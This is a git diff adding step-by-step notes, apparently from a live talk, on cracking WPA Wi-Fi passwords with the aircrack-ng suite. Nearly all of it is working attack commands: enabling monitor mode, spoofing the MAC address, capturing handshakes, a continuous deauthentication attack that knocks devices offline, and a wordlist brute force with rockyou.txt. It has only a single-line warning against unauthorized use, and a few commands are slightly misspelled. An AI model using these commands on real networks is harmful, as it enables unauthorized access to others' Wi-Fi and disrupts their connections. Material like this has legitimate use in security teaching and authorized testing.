@@ -1,3 +1,45 @@
 Commands executed in live during P2P rump on cracking WPA handshakes using airmon-ng
 
+ 1-Set network interface to listen to the wireless traffic
+    
+    sudo airmon-ng start wlan0
+
+Your network interface doesn't have to be wlan0. It can be any wireless interface available on your system
+It can also be an external wi-fi adapter preconfigured or to  be configure if you are using a virtual machine.
+Using the airmon-ng script is the same thing that the following commands:
+    
+    sudo ifconfig wlan0 down
+    iwconfig mode monitor 
+    macchanger -r wlan0     #add a layer of security for the user. 
+                            #DO NOT PERFORM ATTACK ON UNAUTHORIZED NETWORKS
+    sudo ifconfig wlan0 up
+
+ 2-Monitoring traffic
  
+    sudo airodump wlan0
+
+When network is identified, get bssid (wireless network identification) and channel used
+We can now filter our result
+
+    sudo airodump -c <channel> -d <bssid> wlan0
+
+3-Capture WPA hanshake 
+Two steps are required
+First we will start listening the traffic and specify that we want to save our results in a file
+The file will be used to perform password bruteforce attack. It can also be analyzed using Wireshark
+
+    sudo airodump -w <PATH/FILENAME> -c <channel> --d <bssid> wlan0
+
+Second step is to start a desauthentification attack against a connected device to force deconnection
+Once the deconnection is done, there will be a reconnection and so a new hanshake that will be captured by our previous command
+
+    sudo aireplay-ng --deauth 0 -a <bssid> wlan0
+
+4-Set back interface and brute force password
+When WPA handshake is captured your can turn back your wireless interface into manage mode
+    airmon-ng stop wlan0
+
+Then brute force password using in our case rockyou.txt wordlist
+    aircrack-ng <PATH/FILENAME> -w /usr/share/wordlists/rockyou.txt
+
+You can use hashcat to perform a faster brute force attack. It is up to you.
